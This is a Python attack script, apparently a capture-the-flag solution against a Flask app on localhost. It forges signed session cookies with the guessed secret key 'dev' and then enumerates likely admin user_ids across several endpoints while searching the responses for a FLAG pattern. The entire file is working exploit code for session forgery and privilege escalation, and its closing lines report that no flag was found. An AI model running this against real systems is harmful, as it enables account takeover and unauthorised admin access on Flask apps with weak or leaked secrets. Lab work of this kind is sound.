import requests
import re
from itsdangerous import URLSafeTimedSerializer
import hashlib

# Target URL
base_url = "http://127.0.0.1:32883"

# Working secret key
secret_key = 'dev'

def forge_flask_session(secret_key, session_data):
    """Forge a Flask session cookie"""
    try:
        serializer = URLSafeTimedSerializer(
            secret_key,
            salt='cookie-session',
            signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
        )
        forged_cookie = serializer.dumps(session_data)
        return forged_cookie
    except Exception as e:
        print(f"[!] Error forging session: {e}")
        return None

print("[*] Searching for valid admin user_id by trying special IDs")
print("="*80)

# Try common admin user_ids
admin_user_ids = [
    0, 1, 2, 3, 4, 5,  # Low IDs often admin
    100, 1000, 9999,    # Common system IDs
    -1,                 # Negative ID
]

endpoints_to_check = [
    '/dashboard',
    '/admin',
    '/profile',
    '/',
]

found_flag = False

for user_id in admin_user_ids:
    if found_flag:
        break
        
    print(f"\n[*] Testing user_id: {user_id}")
    session_data = {'user_id': user_id}
    forged_cookie = forge_flask_session(secret_key, session_data)
    
    if forged_cookie:
        cookies = {'session': forged_cookie}
        
        for endpoint in endpoints_to_check:
            if found_flag:
                break
                
            url = f"{base_url}{endpoint}"
            response = requests.get(url, cookies=cookies, allow_redirects=True, timeout=5)
            
            # Look for FLAG pattern
            flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
            
            # Check for interesting keywords
            has_admin = 'admin' in response.text.lower()
            has_dashboard = 'dashboard' in response.text.lower()
            has_welcome = 'welcome' in response.text.lower()
            
            if flag_match or has_admin or (response.status_code == 200 and len(response.text) > 2000):
                print(f"  [+] {endpoint}: Status {response.status_code} | Length: {len(response.content)}B")
                
                if has_admin:
                    print(f"  [+] Contains 'admin' keyword")
                if has_welcome:
                    print(f"  [+] Contains 'welcome' keyword")
                    
                if flag_match:
                    print(f"  [!] FLAG FOUND: {flag_match.group(0)}")
                    print(f"  [+] Full Response:\n{response.text}")
                    found_flag = True
                    break
                elif len(response.text) > 2000:
                    # Longer response might be actual dashboard
                    print(f"  [+] Response preview:\n{response.text[:1000]}")

if not found_flag:
    print("\n[-] No flag found with admin user_ids")
    print("[*] The application requires valid user_id from database")
    print("[*] Need to find actual valid user_id through other means")

